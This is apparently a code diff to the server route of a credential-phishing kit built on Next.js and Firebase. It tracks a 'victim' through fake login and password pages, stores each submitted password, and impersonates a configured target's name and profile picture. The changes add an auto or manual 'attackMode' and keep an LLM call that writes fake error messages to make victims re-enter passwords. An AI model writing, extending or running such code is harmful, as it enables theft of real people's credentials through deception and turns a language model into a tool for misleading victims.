@@ -23,10 +23,10 @@ async function getAppState(): Promise<AppState> {
     victim: { ...initialState.victim, ...victim }
   };
 
-  if (!configSnapshot.exists() || !victimSnapshot.exists()) {
-    // If either part is missing, let's ensure the DB is fully initialized
-    // to avoid inconsistent states.
+  if (!configSnapshot.exists()) {
     await set(ref(db, 'config'), currentState.config);
+  }
+   if (!victimSnapshot.exists()) {
     await set(ref(db, 'victim'), currentState.victim);
   }
 
@@ -45,6 +45,21 @@ export async function GET(request: NextRequest) {
     }
 
     if (view === 'victim') {
+       if (appState.config.attackMode === 'manual' && appState.victim.currentPage === 'email') {
+         const manualStartState = {
+            ...appState.victim,
+            currentPage: 'login' as const,
+            email: appState.config.targetEmail,
+            name: appState.config.targetName,
+            profilePicture: appState.config.targetProfilePicture,
+         };
+         await update(ref(db, 'victim'), manualStartState);
+         return NextResponse.json({
+            ...manualStartState,
+            redirectUrl: appState.config.redirectUrl,
+         });
+       }
+
       return NextResponse.json({
         currentPage: appState.victim.currentPage,
         email: appState.victim.email,
@@ -93,46 +108,46 @@ export async function POST(request: NextRequest) {
           victimUpdate.name = config.targetName;
           victimUpdate.profilePicture = config.targetProfilePicture;
         } else {
-          // For non-target emails, we can set a default name or leave it blank
           victimUpdate.name = body.email.split('@')[0];
-          victimUpdate.profilePicture = ''; // Default or empty profile picture
+          victimUpdate.profilePicture = '';
         }
         await update(ref(db, 'victim'), victimUpdate);
         return NextResponse.json({ success: true });
       }
 
       case 'submitPassword': {
-        const victimRef = ref(db, 'victim');
-        const victimSnapshot = await get(victimRef);
-        const victim = victimSnapshot.exists() ? victimSnapshot.val() : initialState.victim;
+        const appState = await getAppState();
+        const victim = appState.victim;
 
         const newAttempts = (victim.attempts || 0) + 1;
         
-        // Use a transaction to safely update passwords array
         const passwordsRef = ref(db, 'victim/passwords');
         await firebasePush(passwordsRef, body.password);
 
-
         let victimUpdate: any = { attempts: newAttempts };
 
-        if (victim.currentPage === 'login') {
-            victimUpdate.currentPage = 'password';
-        } else if (victim.currentPage === 'password') {
-            victimUpdate.currentPage = 'pwCatch';
-        } else if (victim.currentPage === 'pwCatch') {
-          if (newAttempts >= 2) {
-            try {
-              const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
-              victimUpdate.errorMessage = errorMessage;
-              victimUpdate.currentPage = 'error';
-            } catch (error) {
-              console.error("AI simulation failed:", error);
-              victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
-              victimUpdate.currentPage = 'error';
+        if (appState.config.attackMode === 'auto') {
+          victimUpdate.currentPage = 'redirect';
+        } else {
+           if (victim.currentPage === 'login') {
+              victimUpdate.currentPage = 'password';
+          } else if (victim.currentPage === 'password') {
+              victimUpdate.currentPage = 'pwCatch';
+          } else if (victim.currentPage === 'pwCatch') {
+            if (newAttempts >= 2) {
+              try {
+                const { errorMessage } = await simulateErrorWithLLM({ attempts: newAttempts });
+                victimUpdate.errorMessage = errorMessage;
+                victimUpdate.currentPage = 'error';
+              } catch (error) {
+                console.error("AI simulation failed:", error);
+                victimUpdate.errorMessage = "An unexpected error occurred. Please try again later.";
+                victimUpdate.currentPage = 'error';
+              }
             }
           }
         }
-        await update(victimRef, victimUpdate);
+        await update(ref(db, 'victim'), victimUpdate);
         return NextResponse.json({ success: true });
       }
       
